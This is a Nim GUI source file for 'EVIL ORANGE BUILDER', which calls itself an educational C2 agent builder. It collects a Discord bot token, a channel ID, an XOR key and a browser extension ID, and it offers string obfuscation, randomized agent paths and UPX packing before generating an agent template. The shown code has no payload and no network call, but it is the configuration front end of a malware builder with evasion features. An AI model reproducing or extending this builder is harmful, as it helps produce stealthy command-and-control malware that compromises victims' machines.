import nigui, std/[strutils, os, osproc, random]

# ============================================================================
# RENK PALETI
# ============================================================================
const
  BG_COLOR          = "#121417"
  SURFACE_COLOR     = "#1E2228"
  BORDER_COLOR      = "#2C323B"
  PRIMARY_TEXT      = "#E1E4E8"
  SECONDARY_TEXT    = "#8B949E"
  ACCENT_ACTIVE     = "#2EA043"
  ACCENT_WARNING    = "#D29922"
  ACCENT_CRITICAL   = "#F85149"
  ACCENT_FOCUS      = "#58A6FF"

# ============================================================================
# HELPER PROCS
# ============================================================================
proc hexToColor(hex: string): Color =
  let r = parseHexInt(hex[1..2]).byte
  let g = parseHexInt(hex[3..4]).byte
  let b = parseHexInt(hex[5..6]).byte
  rgb(r, g, b)

proc generateRandomKey(): string =
  const hexChars = "0123456789abcdef"
  randomize()
  result = ""
  for _ in 0..<64:
    result.add(hexChars[rand(hexChars.high)])

# ============================================================================
# MAIN
# ============================================================================
app.init()

# Uygulama varsayılan arka plan rengini ayarla
app.defaultBackgroundColor = hexToColor(BG_COLOR)
app.defaultTextColor = hexToColor(PRIMARY_TEXT)

var window = newWindow("EVIL ORANGE BUILDER v2.0")
window.width = 800
window.height = 700

# Window'un içindeki tek control'e arka plan rengi ver
# (Window'un kendisine değil, içindeki container'a)

var mainContainer = newLayoutContainer(Layout_Vertical)
mainContainer.padding = 20
mainContainer.backgroundColor = hexToColor(BG_COLOR)  # ← Control olduğu için çalışır!
window.add(mainContainer)

# Title
var titleLabel = newLabel("EVIL ORANGE BUILDER")
titleLabel.fontSize = 24
titleLabel.fontBold = true
titleLabel.textColor = hexToColor(ACCENT_ACTIVE)
mainContainer.add(titleLabel)

var subtitleLabel = newLabel("Educational C2 Agent Builder")
subtitleLabel.fontSize = 12
subtitleLabel.textColor = hexToColor(SECONDARY_TEXT)
mainContainer.add(subtitleLabel)

var spacer1 = newControl()
spacer1.height = 20
mainContainer.add(spacer1)

# ============================================================================
# CONFIG PANEL
# ============================================================================
var configPanel = newLayoutContainer(Layout_Vertical)
configPanel.padding = 15
configPanel.backgroundColor = hexToColor(SURFACE_COLOR)
mainContainer.add(configPanel)

var configTitle = newLabel("CONFIGURATION")
configTitle.fontSize = 14
configTitle.fontBold = true
configTitle.textColor = hexToColor(PRIMARY_TEXT)
configPanel.add(configTitle)

var spacer2 = newControl()
spacer2.height = 10
configPanel.add(spacer2)

# Discord Token
var tokenRow = newLayoutContainer(Layout_Horizontal)
configPanel.add(tokenRow)

var tokenLabel = newLabel("Discord Bot Token:")
tokenLabel.width = 150
tokenLabel.textColor = hexToColor(PRIMARY_TEXT)
tokenRow.add(tokenLabel)

var tokenInput = newTextBox()
tokenInput.width = 500
tokenInput.backgroundColor = hexToColor(BG_COLOR)
tokenInput.textColor = hexToColor(PRIMARY_TEXT)
tokenRow.add(tokenInput)

# Channel ID
var channelRow = newLayoutContainer(Layout_Horizontal)
configPanel.add(channelRow)

var channelLabel = newLabel("Discord Channel ID:")
channelLabel.width = 150
channelLabel.textColor = hexToColor(PRIMARY_TEXT)
channelRow.add(channelLabel)

var channelInput = newTextBox()
channelInput.width = 500
channelInput.backgroundColor = hexToColor(BG_COLOR)
channelInput.textColor = hexToColor(PRIMARY_TEXT)
channelRow.add(channelInput)

# XOR Key
var keyRow = newLayoutContainer(Layout_Horizontal)
configPanel.add(keyRow)

var keyLabel = newLabel("XOR Key (Hex):")
keyLabel.width = 150
keyLabel.textColor = hexToColor(PRIMARY_TEXT)
keyRow.add(keyLabel)

var keyInput = newTextBox()
keyInput.width = 400
keyInput.backgroundColor = hexToColor(BG_COLOR)
keyInput.textColor = hexToColor(PRIMARY_TEXT)
keyRow.add(keyInput)

var genKeyBtn = newButton("Generate")
genKeyBtn.width = 90
genKeyBtn.backgroundColor = hexToColor(ACCENT_FOCUS)
genKeyBtn.textColor = hexToColor(PRIMARY_TEXT)
keyRow.add(genKeyBtn)

# Extension ID
var extRow = newLayoutContainer(Layout_Horizontal)
configPanel.add(extRow)

var extLabel = newLabel("Extension ID:")
extLabel.width = 150
extLabel.textColor = hexToColor(PRIMARY_TEXT)
extRow.add(extLabel)

var extInput = newTextBox()
extInput.width = 500
extInput.backgroundColor = hexToColor(BG_COLOR)
extInput.textColor = hexToColor(PRIMARY_TEXT)
extInput.text = "jfnphkdpdjgokfnchpnlaekcgchlnfln"
extRow.add(extInput)

# ============================================================================
# OPTIONS PANEL
# ============================================================================
var spacer3 = newControl()
spacer3.height = 15
mainContainer.add(spacer3)

var optionsPanel = newLayoutContainer(Layout_Vertical)
optionsPanel.padding = 15
optionsPanel.backgroundColor = hexToColor(SURFACE_COLOR)
mainContainer.add(optionsPanel)

var optionsTitle = newLabel("BUILD OPTIONS")
optionsTitle.fontSize = 14
optionsTitle.fontBold = true
optionsTitle.textColor = hexToColor(PRIMARY_TEXT)
optionsPanel.add(optionsTitle)

var spacer4 = newControl()
spacer4.height = 10
optionsPanel.add(spacer4)

# Checkboxes
var obfuscateCheck = newCheckbox("String Obfuscation")
obfuscateCheck.textColor = hexToColor(PRIMARY_TEXT)
optionsPanel.add(obfuscateCheck)

var randomPathCheck = newCheckbox("Randomize Agent Path")
randomPathCheck.textColor = hexToColor(PRIMARY_TEXT)
randomPathCheck.checked = true
optionsPanel.add(randomPathCheck)

var upxCheck = newCheckbox("UPX Packing")
upxCheck.textColor = hexToColor(PRIMARY_TEXT)
optionsPanel.add(upxCheck)

var iconCheck = newCheckbox("Custom Icon")
iconCheck.textColor = hexToColor(PRIMARY_TEXT)
optionsPanel.add(iconCheck)

# ============================================================================
# OUTPUT PANEL
# ============================================================================
var spacer5 = newControl()
spacer5.height = 15
mainContainer.add(spacer5)

var outputPanel = newLayoutContainer(Layout_Vertical)
outputPanel.padding = 15
outputPanel.backgroundColor = hexToColor(SURFACE_COLOR)
mainContainer.add(outputPanel)

var outputTitle = newLabel("OUTPUT")
outputTitle.fontSize = 14
outputTitle.fontBold = true
outputTitle.textColor = hexToColor(PRIMARY_TEXT)
outputPanel.add(outputTitle)

var outputText = newTextArea()
outputText.width = 750
outputText.height = 150
outputText.backgroundColor = hexToColor(BG_COLOR)
outputText.textColor = hexToColor(PRIMARY_TEXT)
outputText.editable = false
outputPanel.add(outputText)

# ============================================================================
# BUTTONS
# ============================================================================
var spacer6 = newControl()
spacer6.height = 15
mainContainer.add(spacer6)

var buttonRow = newLayoutContainer(Layout_Horizontal)
buttonRow.height = 40
mainContainer.add(buttonRow)

var buildBtn = newButton("BUILD AGENT")
buildBtn.width = 200
buildBtn.height = 35
buildBtn.backgroundColor = hexToColor(ACCENT_ACTIVE)
buildBtn.textColor = hexToColor(PRIMARY_TEXT)
buildBtn.fontBold = true
buttonRow.add(buildBtn)

var spacerBtn = newControl()
spacerBtn.width = 20
buttonRow.add(spacerBtn)

var clearBtn = newButton("CLEAR")
clearBtn.width = 100
clearBtn.height = 35
clearBtn.backgroundColor = hexToColor(BORDER_COLOR)
clearBtn.textColor = hexToColor(PRIMARY_TEXT)
buttonRow.add(clearBtn)

var spacerBtn2 = newControl()
spacerBtn2.width = 20
buttonRow.add(spacerBtn2)

var exitBtn = newButton("EXIT")
exitBtn.width = 100
exitBtn.height = 35
exitBtn.backgroundColor = hexToColor(ACCENT_CRITICAL)
exitBtn.textColor = hexToColor(PRIMARY_TEXT)
buttonRow.add(exitBtn)

# ============================================================================
# EVENT HANDLERS
# ============================================================================
genKeyBtn.onClick = proc(event: ClickEvent) =
  keyInput.text = generateRandomKey()
  outputText.addLine("[+] Generated new XOR key")

clearBtn.onClick = proc(event: ClickEvent) =
  tokenInput.text = ""
  channelInput.text = ""
  keyInput.text = ""
  extInput.text = "jfnphkdpdjgokfnchpnlaekcgchlnfln"
  outputText.text = ""

exitBtn.onClick = proc(event: ClickEvent) =
  window.dispose()
  app.quit()

buildBtn.onClick = proc(event: ClickEvent) =
  let token = tokenInput.text.strip()
  let channel = channelInput.text.strip()
  let key = keyInput.text.strip()
  let extID = extInput.text.strip()

  if token.len == 0:
    outputText.addLine("[-] ERROR: Discord token required!")
    return
  if channel.len == 0:
    outputText.addLine("[-] ERROR: Channel ID required!")
    return
  if key.len == 0:
    outputText.addLine("[-] ERROR: XOR key required!")
    return
  if key.len != 64:
    outputText.addLine("[-] ERROR: XOR key must be 64 hex characters!")
    return

  outputText.addLine("[*] Building agent...")
  outputText.addLine("[*] Token: " & token[0..<10] & "...")
  outputText.addLine("[*] Channel: " & channel)
  outputText.addLine("[*] XOR Key: " & key[0..<10] & "...")
  outputText.addLine("[*] Extension ID: " & extID)
  outputText.addLine("[*] Randomize Path: " & $randomPathCheck.checked)
  outputText.addLine("[*] Obfuscation: " & $obfuscateCheck.checked)
  outputText.addLine("[*] UPX: " & $upxCheck.checked)
  outputText.addLine("[+] Template generated successfully!")
  outputText.addLine("[+] Ready to compile with: nim c -d:release --opt:size agent.nim")

window.show()
app.run()
